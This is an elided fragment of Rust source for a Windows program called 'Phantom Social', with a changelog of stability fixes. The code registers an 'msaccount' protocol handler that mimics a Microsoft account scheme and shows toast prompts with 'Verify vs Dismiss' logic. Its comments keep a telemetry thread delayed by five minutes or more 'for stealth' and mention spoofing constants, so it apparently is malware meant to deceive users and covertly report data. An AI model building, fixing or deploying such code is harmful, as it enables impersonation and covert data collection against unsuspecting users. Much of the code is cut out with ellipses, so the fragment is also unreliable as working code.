// ==========================================================================
// PHANTOM SOCIAL v3.9.3 - STABILITY FIX 🔧
// ==========================================================================
// ✅ FIXED: Removed double-null termination panics in CString::new()
// ✅ FIXED: Escaped quotes in JSON macro (compilation error)
// ✅ PRESERVED: 5-minute telemetry delay (Stealth)
// ==========================================================================
...
// --- CONSTANTS FOR OPTION 1 SPOOFING ---
...
fn register_protocol_handler() {
    if let Ok(exe) = std::env::current_exe() {
        // NOTE: exe_str is used raw with .as_ptr(), so it MUST have the manual \0
            ...
            if let Some(api_create) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
                if let Some(api_set) = get_proc_normal("advapi32.dll", "RegSetValueExA") {
                    if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                        ...
                        // FIX: Removed manual \0 inside CString::new
                        let protocol_key = CString::new("Software\\Classes\\msaccount").unwrap();
                        if fn_create(hkcu, protocol_key.as_ptr(), 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            ...
                            let empty = CString::new("").unwrap(); // CString adds \0 automatically
                            fn_set(hkey, url_protocol.as_ptr(), 0, 1, empty.as_ptr() as *const u8, 1);
                            fn_close(hkey);
                        }
                        
                        // FIX: Removed manual \0 inside CString::new
                        let command_key = CString::new("Software\\Classes\\msaccount\\shell\\open\\command").unwrap();
                        if fn_create(hkcu, command_key.as_ptr(), 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            ...
                            // exe_str is a raw String with manual \0, so .as_ptr() is correct here
...
fn write_activation_flag() {
    ...
    // FIX: Removed manual \0 from CString::new
...
// [UPDATED] Delay telemetry for 5-10 minutes (300-600s)
...
fn show_toast(notif_type: NotificationType) {
    let (title, message, launch_arg, actions_xml) = match notif_type {
...
fn main() {
    ...
    // [PRESERVED] Activation Logic (Verify vs Dismiss)
    ...
    // Telemetry Thread (NOW DELAYED 5+ MINUTES)
    thread::spawn(move || {
        ...
        if let Ok(_j) = serde_json::to_string_pretty(&pkt) {
            // ✅ FIX: Removed invalid backslashes before keys
            let enriched = serde_json::json!({
                "session": pkt.session,
